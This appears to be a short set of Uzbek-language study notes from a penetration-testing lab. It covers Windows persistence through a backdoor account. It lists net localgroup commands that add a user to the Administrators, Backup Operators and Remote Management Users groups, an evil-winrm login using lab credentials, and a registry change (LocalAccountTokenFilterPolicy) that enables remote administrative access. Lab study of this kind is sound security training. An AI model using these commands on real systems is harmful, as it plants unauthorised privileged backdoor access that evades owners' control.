# Bo'rimiz, gohida qo'yni maskasini ham kiyishimizga to'g'ri keladi)
Bizda Admin huquqi bor backdoor user qoldirishimiz, keyingi ishalrni o'sha userlardan qilishimiz mumkin.

### Userni Guruhlarga qo'shish
Adminlar gruppasiga:
```
net localgroup administrators __username__ /add
```

BackUp gruppasiga:
```
net localgroup "Backup Operators" __username__ /add
```

Remote management group:
```
net localgroup "Remote Management Users" __username__ /add
```

### Userga ulanish:
```
evil-winrm -i 10.10.187.100 -u thmuser1 -p Password321
```
Agar o'rnatilmagan bo'lsa, Arch uchun buyruq:
```
sudo pacman -S evil-winrm
```

Agar biz **evil-winrm**dan foydalanmasdan GUI tarzda ulanishni istasak muhitni quyidagicha qilishimiz kerak:
```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```
